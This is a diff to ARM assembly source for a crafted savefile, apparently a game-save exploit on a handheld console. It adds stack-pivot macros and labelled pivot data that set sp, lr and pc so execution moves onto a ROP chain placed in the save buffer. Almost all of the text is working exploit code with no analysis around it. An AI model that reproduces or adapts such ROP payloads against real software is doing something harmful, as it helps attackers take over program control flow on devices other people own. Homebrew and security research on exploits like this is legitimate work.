@@ -21,6 +21,19 @@ _start:
 
 //ROPBUF: Address of this savefile buffer in the heap. It's unknown whether this varies per-region, there doesn't seem to be any localization strings in memory prior to this heap addr.
 
+.macro ROPMACRO_STACKPIVOT_PREPAREREGS_BEFOREJUMP
+.word POP_R2R6PC
+.word 0 @ r2
+.word 0 @ r3
+.word ROPBUF + (pivotdata - _start) @ r4
+.word 0 @ r5
+.word 0 @ r6
+.endm
+
+.macro ROPMACRO_STACKPIVOT_JUMP
+.word STACKPIVOT_ADR
+.endm
+
 @ The savefile doesn't contain any checksum/CRC.
 
 .word 0x13304f6 @ +0x0 u32: Magicnum 0x13304f6.
@@ -50,8 +63,10 @@ _start:
 .space ((_start + 0x19c) - .)
 pivotdata:
 .word ROPBUF + ((pivotdata+0x8-0x10) - _start) @ ip, also used as the vtableptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
+stackpivot_sploadword:
 .word ROPBUF + (ropstackstart - _start) @ sp
 .word STACKPIVOT_ADR @ lr, also used as the the vtable funcptr for ROP_VTABLEFUNCPTR_x10_CALL_R5OBJ.
+stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
 ropstackstart:
